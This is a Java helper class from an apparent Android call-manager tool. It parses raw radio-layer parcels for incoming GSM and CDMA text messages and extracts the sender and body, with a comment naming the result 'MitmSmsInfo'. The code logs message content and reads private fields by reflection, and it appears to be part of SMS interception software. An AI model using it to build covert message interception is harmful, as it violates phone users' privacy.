package com.vvt.callmanager.filter;

import java.lang.reflect.Field;

import android.os.Parcel;
import android.telephony.SmsMessage;

import com.android.mockcdma.BearerData;
import com.android.mockcdma.SmsHeader;
import com.android.mockcdma.UserData;
import com.vvt.callmanager.ref.Customization;
import com.vvt.callmanager.std.CallMgrUtil;
import com.vvt.callmanager.std.Response;
import com.vvt.callmanager.std.RilConstant;
import com.vvt.callmanager.std.SmsInfo;
import com.vvt.callmanager.std.SmsInfo.SmsType;
import com.vvt.logger.FxLog;

public class FilterSmsHelper {
	
	private static final String TAG = "FilterSmsHelper";
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int CDMA_SMS_LENGTH_TO_HOLD = 153;

	/**
	 * Create an object of MitmSmsInfo from an incoming message
	 * @param p Parcel of a response message
	 * @return
	 */
	public static SmsInfo getSmsInfo(Parcel p) {
		SmsInfo smsInfo = null;

		Response r = Response.obtain(p);
		if (r.type == Response.RESPONSE_UNSOLICITED) {
			if (r.number == RilConstant.RIL_UNSOL_NEW_SMS) {
				smsInfo = getGsmSmsInfo(p);
			}
			else if (r.number == RilConstant.RIL_UNSOL_CDMA_NEW_SMS) {
				smsInfo = getCdmaSmsInfo(p);
			}
		}
		
		return smsInfo;
	}
	
	private static SmsInfo getGsmSmsInfo(Parcel p) {
		SmsInfo smsInfo = null;
		
		int currentPos = p.dataPosition();
		p.setDataPosition(12);
		
	    String rawData = p.readString();
	    byte[] pdus = CallMgrUtil.hexStringToBytes(rawData);
	    
	    SmsMessage sms = SmsMessage.createFromPdu(pdus);
	    
	    if (sms != null) {
	    	smsInfo = new SmsInfo();
	    	smsInfo.setType(SmsType.GSM);
	    	smsInfo.setPhoneNumber(sms.getDisplayOriginatingAddress());
	    	smsInfo.setMessageBody(sms.getDisplayMessageBody());
	    	smsInfo.setMoreMsgToSend(hasMoreMsgGsm(sms));
	    }
	    
	    p.setDataPosition(currentPos);
	    
	    return smsInfo;
	}
	
	@SuppressWarnings("unused")
	private static SmsInfo getCdmaSmsInfo(Parcel p) {
		if (LOGV) FxLog.v(TAG, "getCdmaSmsInfo # ENTER");
		
		int currentPos = p.dataPosition();
		p.setDataPosition(12);
		
		byte[] temp = null;
		
		int teleserviceId = p.readInt();
		byte isServicePresent = p.readByte();
		int serviceCategory = p.readInt();
		int addressDigitMode = p.readInt();
		
		byte digitMode = (byte) (0xFF & addressDigitMode); //p_cur->sAddress.digit_mode
		byte numberMode = (byte) (0xFF & p.readInt()); //p_cur->sAddress.number_mode
	    byte numberType = p.readByte(); //p_cur->sAddress.number_type
	    byte numberPlan = (byte) (0xFF & p.readInt()); //p_cur->sAddress.number_plan
	    
		byte numberOfDigits = p.readByte();
		
		temp = new byte[numberOfDigits];
		for (int i = 0; i < numberOfDigits; i++) {
			temp[i] = p.readByte();
			if (digitMode == CallMgrUtil.DIGIT_MODE_4BIT_DTMF) {
				temp[i] = CallMgrUtil.convertDtmfToAscii(temp[i]);
			}
		}
		
		byte[] addrOrigBytes = temp;
		String oriAddress = new String(addrOrigBytes);
		
		int subAddrType = p.readInt();
		byte subAddrOdd = p.readByte();
		byte subAddrNumberOfDigits = p.readByte();
		
		temp = new byte[subAddrNumberOfDigits];
		for (int i = 0; i < subAddrNumberOfDigits; i++) {
			temp[i] = p.readByte();
		}
		
		byte[] subAddrDigits = temp;
		
		int bearerDataLength = p.readInt();
		temp = new byte[bearerDataLength];
		for (int i = 0; i < bearerDataLength; i++) {
			temp[i] = p.readByte();
		}
		
		byte[] bearerData = temp;
		BearerData decodedData = BearerData.decode(bearerData);
		
//		if (LOGV) {
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # teleserviceId: %d", teleserviceId));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # isServicePresent: %d", isServicePresent));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # serviceCategory: %d", serviceCategory));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # digitMode: %d", digitMode));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # numberMode: %d", numberMode));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # numberType: %d", numberType));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # numberPlan: %d", numberPlan));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # numberOfDigits: %d", numberOfDigits));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # address: %s", oriAddress));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # subAddrType: %s", subAddrType));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # subAddrOdd: %s", subAddrOdd));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # subAddrNumberOfDigits: %s", subAddrNumberOfDigits));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # subAddrDigits: %s", Arrays.toString(subAddrDigits)));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # bearerDataLength: %s", bearerDataLength));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # bearerData: %s", Arrays.toString(bearerData)));
//			FxLog.v(TAG, String.format("getCdmaSmsInfo # Decoded BearerData = %s", decodedData.toString()));
//		}
		
		String messageBody = null;
		
		UserData userData = decodedData.userData;
		if (userData != null) {
			messageBody = userData.payloadStr;
		}
		
		p.setDataPosition(currentPos);
		
		SmsInfo smsInfo = new SmsInfo();
		smsInfo.setType(SmsType.CDMA);
		smsInfo.setPhoneNumber(oriAddress);
		smsInfo.setMessageBody(messageBody);
		smsInfo.setMoreMsgToSend(hasMoreMsgCdma(decodedData));
    	
    	if (LOGV) {
    		FxLog.v(TAG, String.format(
    				"getCdmaSmsInfo # oriAddress: %s, messageBody: %s", 
    				oriAddress, messageBody));
    		
    		FxLog.v(TAG, "getCdmaSmsInfo # EXIT");
    	}
    	return smsInfo;
	}
	
	private static boolean hasMoreMsgCdma(BearerData decodedData) {
		if (LOGV) FxLog.v(TAG, "hasMoreMsgCdma # ENTER ...");
		
		boolean hasMoreMsg = false;
		
		boolean hasUdh = false;
		int msgCount = -1;
		int seqNumber = -1;
		
		int numFields = 0;
		
		// Collect information
		UserData userData = decodedData.userData;
		if (userData != null) {
			SmsHeader udh = userData.userDataHeader;
			if (udh != null) {
				hasUdh = true;
				SmsHeader.ConcatRef concatRef = udh.concatRef;
				if (concatRef != null) {
					msgCount = concatRef.msgCount;
					seqNumber = concatRef.seqNumber;
				}
			}
			numFields = userData.numFields;
		}
		
		if (LOGV) FxLog.v(TAG, String.format(
				"hasMoreMsgCdma # msgCount: %d, seqNumber: %d, numFields: %d", 
				msgCount, seqNumber, numFields));
		
		// Make decision
		if (hasUdh) {
			hasMoreMsg = seqNumber < msgCount;
		}
		else {
			hasMoreMsg = numFields >= CDMA_SMS_LENGTH_TO_HOLD;
		}
		
		if (LOGV) FxLog.v(TAG, String.format(
				"hasMoreMsgCdma # result: %s", hasMoreMsg ? "Yes" : "No"));
		
		if (LOGV) FxLog.v(TAG, "hasMoreMsgCdma # EXIT ...");
		
		return hasMoreMsg;
	}
	
	private static boolean hasMoreMsgGsm(SmsMessage smsMsgObj) {
		if (LOGV) FxLog.v(TAG, "hasMoreMsgGsm # ENTER ...");
		
		boolean hasMoreMsg = false;
		
		try {
			Class<?> cSmsMessage = SmsMessage.class;
			Field fWrapped = cSmsMessage.getDeclaredField("mWrappedSmsMessage");
			fWrapped.setAccessible(true);
			Object oWrapped = fWrapped.get(smsMsgObj);
			
			Class<?> cSmsMessageBase = fWrapped.getType();
			Field fUdh = cSmsMessageBase.getDeclaredField("userDataHeader");
			fUdh.setAccessible(true);
			Object oUdh = fUdh.get(oWrapped);
			
			if (oUdh == null) {
				if (LOGV) FxLog.v(TAG, "hasMoreMsgGsm # No UDH");
			}
			else {
				Class<?> cSmsHeader = fUdh.getType();
				Field fConcatRef = cSmsHeader.getDeclaredField("concatRef");
				fConcatRef.setAccessible(true);
				Object oConcatRef = fConcatRef.get(oUdh);
				
				Class<?> cConcatRef = fConcatRef.getType();
				Field fMsgCount = cConcatRef.getDeclaredField("msgCount");
				Field fSeqNumber = cConcatRef.getDeclaredField("seqNumber");
				
				int msgCount = (Integer) fMsgCount.get(oConcatRef);
				int seqNumber = (Integer) fSeqNumber.get(oConcatRef);
				
				if (LOGV) FxLog.v(TAG, String.format(
						"hasMoreMsgGsm # msgCount: %d, seqNumber: %d", 
						msgCount, seqNumber));
				
				hasMoreMsg = seqNumber < msgCount;
			}
		}
		catch (Exception e) {
			if (LOGE) FxLog.e(TAG, String.format("hasMoreMsgGsm # Failed: %s", e.toString()));
		}
		
		if (LOGV) FxLog.v(TAG, String.format(
				"hasMoreMsgGsm # result: %s", hasMoreMsg ? "Yes" : "No"));
		
		if (LOGV) FxLog.v(TAG, "hasMoreMsgGsm # EXIT ...");
		
		return hasMoreMsg;
	}
	
}
